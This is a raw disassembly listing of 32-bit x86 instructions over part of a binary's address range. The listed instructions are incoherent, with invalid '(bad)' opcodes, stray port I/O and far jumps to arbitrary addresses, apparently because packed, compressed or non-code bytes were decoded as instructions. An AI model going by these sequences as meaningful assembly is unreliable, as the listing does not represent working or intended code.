  40580d:	jge    0x40580f
	...
  405837:	add    BYTE PTR [ebx+0x63],bl
  40583a:	xchg   edx,eax
  40583b:	repz push 0x4bef0082
  405841:	push   ss
  405842:	add    DWORD PTR [ecx+0x3f],esp
  405845:	push   ss
  405846:	and    BYTE PTR [esi],0x42
  405849:	call   0x16b71742
  40584e:	adc    BYTE PTR [esi],0x62
  405851:	out    0xe9,eax
  405853:	imul   esi,DWORD PTR [edi],0xc24c7460
  405859:	or     dh,BYTE PTR cs:[ebp-0x1fc02463]
  405860:	stc    
  405861:	xchg   ecx,eax
  405862:	mov    ebp,DWORD PTR [ebp+eax*4-0x6a0e8a93]
  405869:	jae    0x405846
  40586b:	jmp    0xea3932ad
  405870:	(bad)  
  405872:	or     BYTE PTR [ebp+0x7d206e35],0x68
  405879:	out    dx,al
  40587a:	jnp    0x40583d
  40587c:	xchg   BYTE PTR [eax+0x74],ah
  40587f:	out    0xbd,eax
  405881:	out    dx,eax
  405882:	aaa    
  405883:	out    dx,al
  405884:	inc    ebx
  405885:	jmp    0xf0ff:0x33816906
  40588c:	adc    BYTE PTR [esi-0x3a],0x2d
  405890:	cmp    ch,BYTE PTR [esi+0x0]
  405893:	ret    0x823b
  405896:	add    dl,dl
  405898:	ror    DWORD PTR ds:0xabc9,1
	...
  4058c6:	adc    DWORD PTR [esi+0x54],ebp
  4058c9:	(bad)  
  4058cb:	fld    st(4)
  4058cd:	lds    ecx,FWORD PTR [edx-0x26]
  4058d0:	cmp    eax,0x1c3a4e
  4058d5:	jmp    0xd4c3a25b
  4058da:	retf   0x4121
  4058dd:	jmp    0x49401f
  4058e2:	fs push ebp
  4058e4:	xchg   ebx,eax
  4058e5:	dec    ebx
  4058e6:	es push edi
  4058e8:	add    BYTE PTR [ebp-0x28],dh
  4058eb:	dec    esi
  4058ec:	rcr    BYTE PTR [ebx-0x62],0x97
  4058f0:	or     BYTE PTR [eax],al
  4058f2:	dec    esp
  4058f3:	rol    bh,0x45
  4058f6:	or     ebx,DWORD PTR [edx+0x0]
  4058f9:	add    BYTE PTR [edi-0x1807bb1c],dl
  4058ff:	mov    ds:0x596d0875,al
  405904:	call   DWORD PTR ds:0x412eb8
  40590a:	pushf  
  40590b:	cdq    
  40590c:	je     0x405969
  40590e:	call   DWORD PTR [eax-0x1198ff25]
  405914:	iret   
  405915:	lea    ebx,[edx+0x776a509d]
  40591b:	daa    
  40591c:	call   DWORD PTR ds:0x412ee4
  405922:	dec    esp
  405923:	cdq    
  405924:	je     0x40594f
  405926:	sbb    BYTE PTR ds:0x1e4,ch
	...
  405954:	push   edi
  405955:	pop    ecx
  405956:	add    bh,bh
  405958:	retf   0x8fa1
  40595b:	inc    ebp
  40595c:	setne  BYTE PTR [ebp-0x4]
  405960:	mov    al,ds:0x9283ec1a
  405965:	jae    0x405966
  405967:	jae    0x405987
  405969:	scas   al,BYTE PTR es:[edi]
  40596a:	inc    ebp
  40596b:	lock and eax,0xec000059
  405971:	ins    BYTE PTR es:[edi],dx
  405972:	mov    BYTE PTR [ebp-0x39],0x57
  405976:	add    BYTE PTR [eax],al
  405978:	pop    ss
  405979:	adc    eax,DWORD PTR [eax]
  40597b:	push   0xffffffe7
  40597d:	adc    dl,BYTE PTR [eax]
  40597f:	lea    ebx,[edx]
  405981:	jnp    0x4059d3
  405983:	push   0x3e
  405985:	add    dh,0x75
  405988:	jmp    0x443:0x85aaf1dd
  40598f:	or     edi,esi
  405991:	data16 add al,0x43
  405994:	mov    ebp,0x4a00cf67
  405999:	jp     0x405961
  40599b:	jne    0x40594f
  40599d:	or     bh,cl
  40599f:	fidivr DWORD PTR [esi]
  4059a1:	cmp    BYTE PTR [edx-0x3d],0x5
  4059a5:	cmp    eax,edx
  4059a7:	or     BYTE PTR [esi],bh
  4059a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059aa:	jp     0x405998
  4059ac:	cdq    
  4059ad:	scas   eax,DWORD PTR es:[edi]
  4059ae:	sti    
  4059af:	out    0x39,eax
  4059b1:	cmp    DWORD PTR [eax+eax*1],eax
  4059b4:	(bad)  
  4059b5:	rcr    ebx,1
  4059b7:	inc    ecx
	...
  4059e0:	add    BYTE PTR [eax],al
  4059e2:	mov    ?,WORD PTR ds:0xcf7950c7
  4059e8:	sti    
  4059e9:	dec    edi
  4059ea:	data16 data16 stos BYTE PTR es:[edi],al
  4059ed:	add    BYTE PTR [esi],bh
  4059ef:	stos   BYTE PTR es:[edi],al
  4059f0:	mov    esp,0x30823ac2
  4059f5:	mov    ebp,DWORD PTR [edx+0x1]
  4059f8:	sar    ah,0xed
  4059fb:	add    BYTE PTR [ecx+0x8],cl
  4059fe:	ds out dx,eax
  405a00:	std    
  405a01:	sub    bh,BYTE PTR [esi-0x37]
  405a04:	mov    esp,0x1a8246c2
  405a09:	(bad)  [edx+eax*4-0x7d6bffa7]
  405a10:	pop    ecx
  405a11:	add    BYTE PTR [ecx],ah
  405a13:	pop    es
  405a14:	clc    
  405a15:	(bad)  
  405a16:	xchg   ebx,eax
  405a17:	push   0x59
  405a19:	add    BYTE PTR [edx+eax*4-0x7e1ac925],ah
  405a20:	add    ecx,DWORD PTR [ebx]
  405a22:	(bad)  
  405a23:	and    eax,0x5b838910
  405a28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a29:	(bad)  
  405a2a:	imul   ebp,DWORD PTR [edi-0x6f],0xffffffcd
  405a2e:	fldcw  WORD PTR [ebx-0x6a]
  405a31:	cli    
  405a32:	mov    eax,ds:0xf67ac3e6
  405a37:	add    cl,ch
  405a39:	pop    ecx
  405a3a:	ds ins BYTE PTR es:[edi],dx
  405a3c:	hlt    
  405a3d:	(bad)  
  405a3e:	ins    DWORD PTR es:[edi],dx
  405a3f:	ins    BYTE PTR es:[edi],dx
  405a40:	cld    
  405a41:	test   eax,0x59e0e5
	...
  405a6f:	add    BYTE PTR [esi],bh
  405a71:	add    ecx,ebp
  405a73:	fild   DWORD PTR [eax+edx*4-0x17]
  405a77:	add    esi,DWORD PTR ds:0xcfbdc9b
  405a7d:	adc    DWORD PTR [ecx+0x126b99d6],0xffffffab
  405a84:	lds    edx,FWORD PTR [edi+0x627cbca2]
  405a8a:	jmp    0xc3bf0fbf
  405a8f:	(bad)  
  405a90:	jns    0x405a77
  405a92:	lock fstp TBYTE PTR [ecx+0x77c61e6b]
  405a99:	cwde   
  405a9a:	in     eax,dx
  405a9b:	add    ecx,DWORD PTR [ebx]
  405a9d:	loopne 0x405a9c
  405a9f:	sbb    ebx,0x384fe95e
  405aa5:	fdivr  DWORD PTR [ebx+edi*8+0x49]
  405aa9:	out    0xee,al
  405aab:	sbb    bh,BYTE PTR [esi-0x5f]
  405aae:	sub    edi,ebx
  405ab0:	cmp    ebp,esi
  405ab2:	call   0xde98067b
  405ab7:	dec    edi
  405ab8:	ss jae 0x405a6a
  405abb:	test   eax,0xc3e25b3e
  405ac0:	xchg   edx,eax
  405ac1:	dec    ebx
  405ac2:	cwde   
  405ac3:	push   edi
  405ac4:	inc    edx
  405ac5:	push   0x34
  405ac7:	clc    
  405ac8:	or     cl,dh
  405aca:	jmp    eax
  405acc:	in     eax,0x1a
  405ace:	jmp    FWORD PTR [esi+0x72187703]
	...
  405afc:	add    BYTE PTR [eax],al
  405afe:	xor    DWORD PTR [edi+0x40],edx
  405b01:	cmp    DWORD PTR [edx],ecx
  405b03:	icebp  
  405b04:	out    dx,al
  405b05:	xchg   esi,eax
  405b06:	sti    
  405b07:	or     edi,edi
  405b09:	adc    al,0xd6
  405b0b:	sbb    bh,bh
  405b0d:	cld    
  405b0e:	aad    0x82
  405b10:	lahf   
  405b11:	mov    es,WORD PTR [ebx]
  405b13:	imul   ebx,DWORD PTR [eax-0x60],0xfffffffc
  405b17:	push   ebx
  405b18:	add    BYTE PTR [edi+esi*1],dl
  405b1b:	ja     0x405b73
  405b1d:	mov    esi,0xf17dde6e
  405b22:	cmp    eax,0x7a0208f0
  405b27:	push   es
  405b28:	pop    edi
  405b29:	scas   eax,DWORD PTR es:[edi]
  405b2a:	aam    0x9d
  405b2c:	or     cl,ch
  405b2e:	push   ss
  405b2f:	and    BYTE PTR [edx+ebp*2],cl
  405b32:	mov    ds:0xee290b5c,al
  405b37:	push   ebx
  405b38:	sub    ebp,DWORD PTR [ecx]
  405b3a:	daa    
  405b3b:	or     bl,BYTE PTR [esi+0x30]
  405b3e:	jl     0x405b93
  405b40:	add    BYTE PTR [edx+0x21],dh
  405b43:	push   edi
  405b44:	mov    ebx,DWORD PTR [ebp+eiz*2+0x702fed5]
  405b4b:	add    DWORD PTR [ebx+0x3067bdef],ecx
  405b51:	jnp    0x405b9a
  405b53:	jmp    0xfd80:0x5ff2b0fb
  405b5a:	dec    ebp
  405b5b:	jbe    0x405b8a
  405b5d:	imul   edi,ecx,0xec721b
	...
  405b8b:	add    BYTE PTR [ebp+0x225e4666],bh
  405b91:	jmp    0xa:0x9ec228eb
  405b98:	in     al,dx
  405b99:	jb     0x405c1a
  405b9b:	cld    
  405b9c:	jbe    0x405bab
  405b9e:	or     eax,0x7707cb80
  405ba3:	or     BYTE PTR [edi-0x6e],ah
  405ba6:	popa   
  405ba7:	and    BYTE PTR [ebx+0xc09ea63],0x9e
  405bae:	pop    ebx
  405baf:	pop    edi
  405bb0:	sub    DWORD PTR [esi+0x61e708c2],esp
  405bb6:	xor    BYTE PTR [edx-0x31],dh
  405bb9:	popa   
  405bba:	cmp    DWORD PTR [edi-0x1d],esi
  405bbd:	push   ecx
  405bbe:	xor    bl,ch
  405bc0:	repnz popa 
  405bc2:	inc    ecx
  405bc3:	jb     0x405b62
  405bc5:	popa   
  405bc6:	inc    esi
  405bc7:	ja     0x405b6a
  405bc9:	push   ecx
  405bca:	inc    ecx
  405bcb:	add    al,0xad
  405bcd:	adc    BYTE PTR [edi],0x3c
  405bd0:	jbe    0x405bdd
  405bd2:	or     bh,BYTE PTR [ecx+eax*4]
  405bd5:	push   ss
  405bd6:	push   es
  405bd7:	sub    al,0x86
  405bd9:	imul   ecx,DWORD PTR [ecx],0xc0428eeb
  405bdf:	pop    ebx
  405be0:	test   al,0x3f
  405be2:	leave  
  405be3:	ret    0x5d5f
  405be6:	shl    al,0x63
  405be9:	arpl   bx,ax
  405beb:	stos   BYTE PTR es:[edi],al
  405bec:	lods   al,BYTE PTR ds:[esi]
  405bed:	and    al,BYTE PTR [ebx+0xc6]
	...
  405c17:	add    BYTE PTR [eax],al
  405c19:	add    BYTE PTR [ebp+0x62],dl
  405c1c:	fidiv  DWORD PTR [ebp-0x1a]
  405c1f:	aad    0x1
  405c21:	add    BYTE PTR [edi+0x5d],ah
  405c24:	pop    ebx
  405c25:	pop    edi
  405c26:	test   eax,0x5708c2a4
  405c2b:	ss push ebx
  405c2d:	push   eax
  405c2e:	iret   
  405c2f:	add    al,0x1f
  405c31:	sub    ah,BYTE PTR [edi+0x5f]
  405c34:	clc    
  405c35:	jb     0x405c4d
  405c37:	mov    ds:0x733ebbff,al
  405c3c:	add    eax,DWORD PTR [eax]
  405c3e:	fstp   DWORD PTR ds:[eax+0x2d727f4d]
  405c45:	add    DWORD PTR [ecx-0x76],esi
  405c48:	inc    edx
  405c49:	std    
  405c4a:	add    DWORD PTR [edx+0x65fad7e7],esi
  405c50:	ret    
  405c51:	mov    ecx,0xffc3c1f1
  405c56:	in     al,dx
  405c57:	sbb    ah,bh
  405c59:	push   es
  405c5a:	imul   ebx,edx,0xffffff8f
  405c5d:	ret    
  405c5e:	jne    0x405c99
  405c60:	(bad)  
  405c61:	push   ebp
  405c62:	(bad)
  405c65:	(bad)  
  405c66:	into   
  405c67:	inc    ebp
  405c68:	push   esp
  405c69:	pop    eax
  405c6a:	push   esi
  405c6b:	dec    ebx
  405c6c:	out    dx,al
  405c6d:	aas    
  405c6e:	ds jmp 0x3d87:0x17d0135
  405c76:	int    0xad
  405c78:	inc    esp
  405c79:	add    BYTE PTR [esi],bh
  405c7b:	xchg   BYTE PTR ds:0x83,dl
	...
  405ca5:	add    BYTE PTR [eax],al
  405ca7:	add    BYTE PTR [ebx-0x13],bl
  405caa:	dec    esi
  405cab:	inc    ecx
  405cac:	ds jb  0x405ce6
  405caf:	or     DWORD PTR [ebp-0xb45d99],edi
  405cb5:	jno    0x405cba
  405cb7:	jne    0x405cfc
  405cb9:	pop    ebp
  405cba:	les    ebx,FWORD PTR [ebx-0x79]
  405cbd:	xor    eax,0xd456daef
  405cc2:	fadd   QWORD PTR [eax]
  405cc4:	call   FWORD PTR ds:[eax-0x4]
  405cc8:	in     al,dx
  405cc9:	fisttp DWORD PTR [ebx]
  405ccb:	push   eax
  405ccc:	push   ecx
  405ccd:	xchg   DWORD PTR [esi+0xe71ff4b],edx
  405cd3:	shl    BYTE PTR [ecx],0xf6
  405cd6:	xchg   ebx,eax
  405cd7:	add    BYTE PTR [esi],bh
  405cd9:	jb     0x405ca5
  405cdb:	inc    ebp
  405cdc:	ss pop ebx
  405cde:	jmp    0x6c9b9ae6
  405ce3:	dec    eax
  405ce4:	or     eax,DWORD PTR es:[ebx+0x4]
  405ce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ce9:	pop    ebx
  405cea:	inc    ebx
  405ceb:	add    eax,0xc2c4ee11
  405cf0:	xor    eax,esp
  405cf2:	xor    al,BYTE PTR [ebp+0x3e]
  405cf5:	push   esp
  405cf6:	test   eax,0xf7736438
  405cfb:	fdivr  QWORD PTR [esi]
  405cfd:	pop    ebx
  405cfe:	push   0xffffffbb
  405d00:	fs out dx,al
  405d02:	or     BYTE PTR [edi+0x37e96363],al
  405d08:	je     0x405d72
  405d0a:	adc    al,0xbc
	...
  405d34:	add    BYTE PTR [eax],al
  405d36:	out    0x76,al
  405d38:	xchg   esp,eax
  405d39:	ret    0xd1c9
  405d3c:	and    al,0xb8
  405d3e:	mov    bl,0x1d
  405d40:	jno    0x405d95
  405d42:	mov    ecx,0x2bc270ed
  405d47:	outs   dx,DWORD PTR ds:[esi]
  405d48:	rol    DWORD PTR [ecx+ebp*4],cl
  405d4b:	in     eax,dx
  405d4c:	pop    esp
  405d4d:	ret    0xc44b
  405d50:	mov    ds:0x29543e44,al
  405d55:	aaa    
  405d56:	pusha  
  405d57:	aam    0xac
  405d59:	mov    bh,0xb5
  405d5b:	dec    edx
  405d5c:	ins    BYTE PTR es:[edi],dx
  405d5d:	dec    eax
  405d5e:	mov    cs,WORD PTR [edx]
  405d60:	fwait
  405d61:	ret    0xc853
  405d64:	mov    ds:0x29543e44,al
  405d69:	aaa    
  405d6a:	inc    esp
  405d6b:	repz gs push eax
  405d6e:	call   FWORD PTR [edx+0x16]
  405d71:	cmp    BYTE PTR [esi+0x72],cl
  405d74:	std    
  405d75:	fidivr DWORD PTR [esi]
  405d77:	pop    ebx
  405d78:	bnd ret 
  405d7a:	rcr    DWORD PTR [ecx-0x56],cl
  405d7d:	ret    0x6acb
  405d80:	add    BYTE PTR [ecx],al
  405d82:	jo     0x405d07
  405d84:	add    cl,ch
  405d86:	cld    
  405d87:	lock repz rol ebx,1
  405d8b:	js     0x405d8c
  405d8d:	fdivp  st(7),st
  405d8f:	lock sti 
  405d91:	rol    DWORD PTR [ecx-0x3d16ff7d],0x9a
  405d98:	pop    ebx
  405d99:	mov    al,0x0
	...
  405dc3:	add    BYTE PTR [ebx],al
  405dc5:	adc    DWORD PTR [ebx-0x3f604233],ecx
  405dcb:	mov    bh,0xff
  405dcd:	push   bx
  405dcf:	sbb    DWORD PTR [edx+0x7dd23ff3],edx
  405dd5:	pop    ebx
  405dd6:	clc    
  405dd7:	sbb    edi,DWORD PTR ds:0xd96aff9a
  405ddd:	or     eax,0x5b3a284b
  405de2:	je     0x405dc6
  405de4:	ret    0x5b28
  405de7:	xor    bh,BYTE PTR [ebp+0x5b]
  405dea:	add    ch,bh
  405dec:	push   ebx
  405ded:	fidivr DWORD PTR ds:0x1c035a
  405df3:	jmp    0x1cc3b269
  405df8:	(bad)  
  405df9:	adc    al,BYTE PTR [ecx-0x17]
  405dfc:	cmp    eax,0x7a0204f0
  405e01:	add    cl,cl
  405e03:	sub    bl,BYTE PTR [ebx-0x192b007f]
  405e09:	adc    DWORD PTR [ecx-0x17],eax
  405e0c:	les    esp,FWORD PTR [eax]
  405e0e:	hlt    
  405e0f:	es mov ecx,0x7f26fe97
  405e15:	xor    eax,DWORD PTR [ecx]
  405e17:	jmp    0x83404f59
  405e1c:	inc    ebx
  405e1d:	jae    0x405e92
  405e1f:	xor    DWORD PTR [edx],edi
  405e21:	pop    ebx
  405e22:	add    DWORD PTR [eax],0x3f
  405e25:	pushf  
  405e26:	je     0x405e2c
	...
  405e50:	add    BYTE PTR [eax],al
  405e52:	popa   
  405e53:	pop    ecx
  405e54:	add    BYTE PTR [eax],al
  405e56:	sahf   
  405e57:	fmulp  st(0),st
  405e59:	(bad)  
  405e5a:	and    BYTE PTR [ebx-0x640c7a73],bl
  405e60:	(bad)  
  405e61:	jmp    DWORD PTR [edi-0x64]
  405e64:	mov    ch,0xc8
  405e66:	icebp  
  405e67:	call   0x0:0x874fe8ff
  405e6e:	or     al,0x9a
  405e70:	je     0x40b83a
  405e76:	jg     0x405e9d
  405e78:	dec    ebp
  405e79:	inc    ecx
  405e7a:	out    0xd4,eax
  405e7c:	test   eax,esi
  405e7e:	mov    eax,ds:0xcf50ff9a
  405e83:	push   cs
  405e84:	fld    DWORD PTR [eax]
  405e86:	out    0x56,eax
  405e88:	ror    BYTE PTR [edi],0x5b
  405e8b:	lahf   
  405e8c:	add    BYTE PTR [eax],al
  405e8e:	xlat   BYTE PTR ds:[ebx]
  405e8f:	xchg   edx,eax
  405e90:	test   esp,eax
  405e92:	inc    ecx
  405e93:	fwait
  405e94:	inc    DWORD PTR [eax]
  405e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e97:	pop    ecx
  405e98:	add    BYTE PTR [ebp-0x161e6],cl
  405e9e:	and    BYTE PTR [edx],cl
  405ea0:	push   DWORD PTR [ebp-0x6395]
  405ea6:	lock dec esp
  405ea8:	pop    ebx
  405ea9:	dec    ebx
  405eaa:	out    0x59,al
  405eac:	mov    edx,DWORD PTR [ebp-0x63a5]
  405eb2:	mov    WORD PTR [ecx+0x840f],ds
	...
  405ee0:	cvtps2pd xmm0,QWORD PTR [eax]
  405ee3:	add    BYTE PTR [esp+ecx*1-0xc],ch
  405ee7:	pminub mm1,mm2
  405eea:	add    BYTE PTR [eax],al
  405eec:	push   edi
  405eed:	call   0xffc0:0x4e3ed4b5
  405ef4:	in     al,0x73
  405ef6:	sub    eax,DWORD PTR [eax]
  405ef8:	ds je  0x405f00
  405efb:	call   0x43ab49
  405f00:	inc    ebp
  405f01:	xor    dh,BYTE PTR [edi]
  405f03:	jns    0x405ecc
  405f05:	mov    edi,0x7e838dbb
  405f0a:	push   esp
  405f0b:	push   0x17415
  405f10:	sbb    DWORD PTR [eax],ecx
  405f12:	mov    esp,0x4ae12bff
  405f17:	inc    ecx
  405f18:	ds imul eax,ebx,0x39a56674
  405f1f:	cld    
  405f20:	stc    
  405f21:	xchg   DWORD PTR [esi+0xa727f4b],edx
  405f27:	shl    BYTE PTR [edx+0x7b],0x42
  405f2b:	(bad)  
  405f2c:	mov    ebx,0xd9ffbeb2
  405f31:	jb     0x405f36
  405f33:	add    BYTE PTR [esi],bh
  405f35:	pop    es
  405f36:	mov    eax,eax
  405f38:	enter  0xbfdd,0x50
  405f3c:	push   esi
  405f3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f3e:	add    ecx,DWORD PTR [edi]
  405f40:	ficomp DWORD PTR ds:[ebx+0xd8]
	...
  405f6b:	add    BYTE PTR [eax],al
  405f6d:	add    BYTE PTR [esi],bh
  405f6f:	jb     0x405f7b
  405f71:	shl    BYTE PTR [ebx],0x67
  405f74:	cmp    BYTE PTR [ebp-0x40fb82],0x3e
  405f7b:	xchg   BYTE PTR [edi],cl
  405f7d:	dec    ebx
  405f7f:	xor    bh,BYTE PTR [esi+0x8ed89ff]
  405f85:	aad    0xf6
  405f87:	mov    dl,0x3
  405f89:	jmp    0x405fb8
  405f8b:	sbb    DWORD PTR [edx],ebx
  405f8d:	(bad)  
  405f8e:	jmp    0x405fc5
  405f90:	lods   al,BYTE PTR ds:[esi]
  405f91:	lock nop
  405f93:	pop    ebx
  405f94:	jmp    0x212ec09c
  405f99:	lods   al,BYTE PTR ds:[esi]
  405f9a:	data16 (bad) 
  405f9c:	jmp    0xe93c4a4
  405fa1:	cmp    DWORD PTR [esi+0x73],eax
  405fa4:	daa    
  405fa5:	(bad)  
  405fa6:	ds pop ebx
  405fa8:	ins    BYTE PTR es:[edi],dx
  405fa9:	mov    DWORD PTR [edx],ecx
  405fab:	idiv   BYTE PTR gs:[esi-0x33cb9b72]
  405fb2:	sub    BYTE PTR [esi+eiz*8-0x55],ah
  405fb6:	nop
  405fb7:	mov    ecx,gs
  405fb9:	add    esp,DWORD PTR [edi]
  405fbb:	pop    esi
  405fbc:	(bad)  
  405fbd:	mov    esi,0xcb946411
  405fc2:	or     BYTE PTR [esi+eax*8-0x55],ah
  405fc6:	ret    0xe98c
  405fc9:	add    eax,ebp
  405fcb:	xchg   edi,eax
  405fcc:	adc    cl,ch
  405fce:	std    
  405fcf:	or     eax,0xaf62
	...
  405ffc:	mov    ebp,0x8d53959e
  406001:	or     bh,BYTE PTR [ebx]
  406003:	push   edi
  406004:	jo     0x405fd6
  406006:	sub    al,0x10
  406008:	ret    
  406009:	shr    BYTE PTR [ecx+0x3],cl
  40600c:	ds pop ebx
  40600e:	je     0x406027
  406010:	sti    
  406011:	pop    edx
  406012:	jmp    0x92109e1a
  406017:	mov    al,BYTE PTR [esi-0x48fa7e67]
  40601d:	sbb    eax,0x53238a55
  406022:	jmp    0x9d82:0x695b80bc
  406029:	and    eax,DWORD PTR [edx]
  40602b:	mov    ebx,0x32015fbd
  406030:	xor    BYTE PTR [eax+0x42],bl
  406033:	jnp    0x406033
  406035:	pop    edx
  406036:	add    cl,ch
  406038:	cmp    eax,0xa5eac330
  40603d:	arpl   WORD PTR [ebp+0x15],ax
  406040:	mov    dl,0xb
  406042:	cmp    BYTE PTR [esi+edx*1+0x6b],ch
  406046:	(bad)  
  406047:	out    dx,eax
  406048:	cmp    bh,BYTE PTR [eax]
  40604a:	inc    ebp
  40604b:	xchg   BYTE PTR [eax-0x2b8ffbe4],al
  406051:	xchg   ebp,eax
  406052:	out    dx,eax
  406053:	adc    DWORD PTR es:[ebx-0x2],0x15
  406058:	mov    bh,0xc3
  40605a:	(bad)  
  40605b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40605c:	cmp    ecx,ebp
  40605e:	push   ebx
  40605f:	sbb    eax,DWORD PTR [eax]
	...
  406089:	add    BYTE PTR [edx+0x62],cl
  40608c:	jne    0x40605b
  40608e:	fucomi st,st(0)
  406090:	pop    es
  406091:	fs jns 0x4060ff
  406094:	push   eax
  406095:	shl    DWORD PTR [ecx],0x5b
  406098:	add    cl,ch
  40609a:	shl    DWORD PTR [esp+eax*1-0x74a4c217],0x34
  4060a2:	dec    edx
  4060a3:	outs   dx,BYTE PTR ds:[esi]
  4060a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060a5:	jnp    0x8282b9b0
  4060ab:	xchg   esp,eax
  4060ac:	ret    0x3ded
  4060af:	or     BYTE PTR [ebx-0x368407b],cl
  4060b5:	aaa    
  4060b6:	jae    0x4060c3
  4060b8:	push   ebx
  4060b9:	sbb    BYTE PTR [esi+edx*8+0x75],ch
  4060bd:	in     eax,dx
  4060be:	(bad)  
  4060bf:	loopne 0x4060c8
  4060c1:	(bad)  
  4060c2:	stc    
  4060c3:	dec    edx
  4060c4:	mov    DWORD PTR [esi+edi*2],esp
  4060c7:	(bad)  
  4060c8:	pop    es
  4060c9:	jb     0x4060ce
  4060cb:	push   edi
  4060cc:	mov    ebp,DWORD PTR [esi-0x1aa829bb]
  4060d2:	(bad)  
  4060d3:	xor    edx,DWORD PTR fs:[ebx-0x61]
  4060d7:	xor    eax,DWORD PTR gs:[eax]
  4060da:	std    
  4060db:	rol    DWORD PTR [edi+eax*1-0x28960581],1
  4060e2:	fs pop eax
  4060e4:	rol    eax,0x60
  4060e7:	pop    ebx
  4060e8:	ret    
  4060e9:	mov    ebx,DWORD PTR [esp+ebp*2]
  4060ec:	clc    
  4060ed:	and    eax,DWORD PTR [eax]
	...
  406117:	add    BYTE PTR [edi],bl
  406119:	ins    BYTE PTR es:[edi],dx
  40611a:	clc    
  40611b:	(bad)  
  40611c:	rol    DWORD PTR [edi+0x56],cl
  40611f:	mov    bh,0x20
  406121:	scas   eax,DWORD PTR es:[edi]
  406122:	add    edx,DWORD PTR [esi+0x53]
  406125:	popf   
  406126:	ret    0x240c
  406129:	mov    cs,WORD PTR [ebx+0x23a2f4f8]
  40612f:	cli    
  406130:	in     al,0xa2
  406132:	lea    ecx,[eax+ebp*1+0x43207083]
  406139:	pop    esp
  40613a:	dec    esi
  40613b:	or     dh,ah
  40613d:	pushf  
  40613e:	adc    DWORD PTR [ebx],eax
  406140:	fst    st(2)
  406142:	cli    
  406143:	xor    edi,edi
  406145:	jp     0x40613f
  406147:	xor    edi,edi
  406149:	rcr    BYTE PTR [edi+ebx*1-0x3e427007],1
  406150:	aam    0xff
  406152:	or     eax,ecx
  406154:	xchg   esp,eax
  406155:	inc    edi
  406156:	add    ebx,ecx
  406158:	dec    esp
  406159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40615a:	xor    edi,edx
  40615c:	add    al,0xa3
  40615e:	xor    edi,edx
  406160:	push   0xffffffda
  406162:	pop    es
  406163:	scas   eax,DWORD PTR es:[edi]
  406164:	enter  0xf521,0x3
  406168:	popa   
  406169:	inc    edi
  40616a:	rol    eax,0xa0
  40616d:	pop    edx
  40616e:	ret    
  40616f:	mov    ebp,DWORD PTR [ebx+ebp*2]
  406172:	clc    
  406173:	and    ebx,DWORD PTR [edi]
  406175:	imul   edi,eax,0xffffff8d
  406178:	adc    eax,DWORD PTR [edi+0x2a]
  40617b:	mov    BYTE PTR [eax],0x0
	...
  4061a6:	ds icebp 
  4061a8:	inc    ebx
  4061a9:	add    esi,eax
  4061ab:	addr16 ret 0x32c2
  4061af:	jne    0x406184
  4061b1:	mov    esi,DWORD PTR [esi+0x64]
  4061b4:	mov    eax,0xb8647423
  4061b9:	lea    edi,[edx+0x2e461080]
  4061bf:	or     al,0x0
  4061c1:	dec    esi
  4061c2:	ss xor eax,edx
  4061c5:	adc    DWORD PTR ds:0xdfa883e,edi
  4061cb:	dec    esp
  4061cc:	loopne 0x4061c6
  4061ce:	or     eax,0x599c8e5c
  4061d3:	jae    0x40616b
  4061d5:	inc    esi
  4061d6:	xor    esi,DWORD PTR [esi+0x5d]
  4061d9:	sbb    al,0xff
  4061db:	xor    eax,0xee070315
  4061e0:	mov    esp,0xbf561433
  4061e5:	xor    edx,DWORD PTR [eax+edi*8]
  4061e8:	jg     0x4061f1
  4061ea:	out    0xea,al
  4061ec:	sub    DWORD PTR [ecx+0x3d],0x30
  4061f0:	in     al,0xc0
  4061f2:	(bad)  
  4061f3:	jns    0x4061fb
  4061f5:	ret    
  4061f6:	lds    ebp,FWORD PTR [ebp-0x55e20709]
  4061fc:	idiv   eax
  4061fe:	mov    bl,0xde
  406200:	adc    ch,BYTE PTR [edi+0x38f36d1]
  406206:	push   0xc2c48e
	...
  406233:	add    BYTE PTR [edx],bh
  406235:	jne    0x40620a
  406237:	mov    eax,esi
  406239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40623a:	mov    esi,0xbea5b423
  40623f:	(bad)  
  406240:	ret    0x7479
  406243:	pop    ebx
  406244:	test   eax,0x564e06f1
  406249:	pop    ebx
  40624a:	sub    ch,al
  40624c:	das    
  40624d:	pop    esp
  40624e:	xor    ecx,DWORD PTR [edi-0x18aed36c]
  406254:	xchg   BYTE PTR [ecx+edx*2],ch
  406257:	mov    DWORD PTR [edx+0x1ad38740],esp
  40625d:	shr    dl,cl
  40625f:	pop    ecx
  406260:	and    bl,BYTE PTR [edx-0x7dc2edd6]
  406266:	bound  edi,QWORD PTR [ebp-0x41359ad3]
  40626c:	or     eax,0x39806c65
  406271:	cmp    eax,0x5bd593f8
  406276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406277:	repz jle 0x406215
  40627a:	out    dx,al
  40627b:	push   es
  40627c:	std    
  40627d:	rol    DWORD PTR [edx],cl
  40627f:	div    DWORD PTR [esi]
  406281:	cmp    al,0xf1
  406283:	mul    BYTE PTR [esi]
  406285:	into   
  406286:	push   ebp
  406287:	adc    ecx,ebp
  406289:	jmp    0x97e1b0e
  40628e:	adc    eax,0xea4efcc5
  406293:	shl    DWORD PTR [ebp+0xbf1a62],cl
	...
  4062c1:	add    BYTE PTR [ebp+0x65],bl
  4062c4:	cli    
  4062c5:	mov    esi,0x89eececb
  4062ca:	jge    0x4062ae
  4062cc:	mov    es,WORD PTR [esi]
  4062ce:	js     0x4062f3
  4062d0:	test   al,0xc4
  4062d2:	dec    edi
  4062d3:	pop    esp
  4062d4:	mov    bl,0x8e
  4062d6:	aam    0x2b
  4062d8:	mov    eax,ds:0x912bd6e6
  4062dd:	mov    BYTE PTR [edx-0x75f437c1],ch
  4062e3:	adc    edx,ebp
  4062e5:	pop    ecx
  4062e6:	jp     0x406282
  4062e8:	stos   BYTE PTR es:[edi],al
  4062e9:	adc    DWORD PTR ds:0xea620082,edi
  4062ef:	sub    edi,ebx
  4062f1:	retf   0x2be3
  4062f4:	stc    
  4062f5:	je     0x406310
